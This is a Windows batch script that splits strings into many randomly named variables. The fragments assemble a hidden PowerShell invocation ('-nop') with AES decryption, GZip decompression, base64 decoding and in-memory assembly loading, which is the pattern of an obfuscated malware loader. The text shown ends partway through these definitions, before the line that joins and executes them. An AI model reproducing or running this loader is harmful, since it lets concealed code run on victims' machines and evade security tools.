@echo off
set "zXLwpzRTfD=he"
set "HYdlwjHfKo=1."
set "YigkgTowXr=po"
set "OWGyODiAux=\W"
set "tYkaFiKCpo=st"
set "FaZEtpDOxE=ll"
set "SlPvQECRyZ=Po"
set "MVjhkAdXxj=.e"
set "LXCCSfoXdd=xe"
set "hKRVeipdoo=\v"
set "YXqSWWIsJe=co"
set "SYOIXEsGhM= C"
set "WGiltqdWBo=Sy"
set "RkCzaKJrsR=0\"
set "HxeiMWirUu=rs"
set "VzZptaMkSd=em"
set "DTdxOiSyEJ=do"
set "pZhkGVSjJG=we"
set "CsAaFXzXCi=s\"
set "pLZezZTBBP=ws"
set "DckWARThNh=ow"
set "PeIFpwpLWV= /"
set "fYuBHDODmO=y "
set "cZtsCHXOik=we"
set "DgsbAsdHGk=he"
set "LJWLhCWEOn=rS"
set "kUzQfOHMxW=Wi"
set "nWIomwHTRs=in"
set "AlgLwWTZDk=32"
set "foKbKkxUjQ=py"
set "UkislRQjWt=ll"
set "DnvCoCHfti=:\"
set "tnkybZjIUs=nd"
set "hkkRUbcVYg= %~dp0"
set "jSlIZAQyYC=cd"
set "pLaKwIeLei=qf ="
set "aexbYotbGE=] -j"
set "ECJtnVeFcv=isfL"
set "quoCPfrEDm=gok "
set "dTNowIJtTY=S) {"
set "UQbObPBeCU= if "
set "bhSFFwDEYM=Nig "
set "GvCSNhJLka=eam("
set "DlHFXuxOth=hy.A"
set "FQOJLeDxQv=v4Ir"
set "eVcaxsVEgD=();$"
set "PnlmfBdVJW=.Dis"
set "mEbtXeECnv=embl"
set "IaWYQcCXUF=Secu"
set "DwnCluhfEE= = $"
set "kuaudbYYhX=;$Vg"
set "ISIxkyjGsS=ck($"
set "yLuJiIrxZy=gok."
set "kqFNJgWyNk=Syst"
set "WTAVIRGnrS=($MZ"
set "IzMMeLYUsh=gMod"
set "hSENQCyEwC='txe"
set "bjjWYwWZjf=K = "
set "bfeEtPPKLO=xGnO"
set "PWoERksepb=ring"
set "PkNuAnZwfG=rity"
set "hFoRvZqVlq=n ''"
set "pFbNyShLXw=hISb"
set "MwJrapbKVA=oK);"
set "tHoWwVHeKY=)) {"
set "KsULxXcwCb=)($j"
set "gEZOuastxB=Disp"
set "AOOTiiVCDw= = N"
set "KPxDAHzaUy=.GZi"
set "ksOzgGtmGI=)))"
set "AQzoCsCaFq=KHLv"
set "LDYDnysmRP=y.Ci"
set "ACKSInwtRN=k = "
set "wPzgGCUiww=3HWs"
set "VIhsNhMAiJ=)($d"
set "cPTHYgYYZy=-nop"
set "sHSXZZsqvo=Comp"
set "ElIuSFwIFi=1] -"
set "NrmwkPrHci===')"
set "YCACQJdHQv=;$dr"
set "CzGqMXIrYm=qf);"
set "BDLvipmEQs=[IO."
set "wQHWglYzpU=]::("
set "QJRMnudTUQ=join"
set "sCJpPKIzgw=rans"
set "CfSjGLIsor= '')"
set "XNQUZcHZte=Comp"
set "zbeiWLOAEC=]::C"
set "gMETqsKMjH=e]::"
set "eDyfdSKmtC=, $j"
set "hlCTkOaxZU=0O+g"
set "pvnhQlIVKO=em.C"
set "CVpzxcXRKw==');"
set "UCtlhkRDIr=iron"
set "sKTsnXDiOD=ress"
set "clqFshxNzT=..-1"
set "hGnrJueKLO=7Yiv"
set "CbsRHXyTNU=raph"
set "YLKeDPAvZd=m.IO"
set "XFRaXmGLBa=tS46"
set "HuDCrTllON=New-"
set "XIApkAytGk=Sb.I"
set "EOCrKwcwji== [S"
set "JntsweSyFX=);$R"
set "nGjXrxXdjk=ewLi"
set "wUlproJdKY=oD.T"
set "OJOBNKIvWt=gth)"
set "WlUHIKfbjp=oryS"
set "qgUAFfAqEM=y.Cr"
set "RGJnGwYBos=drNi"
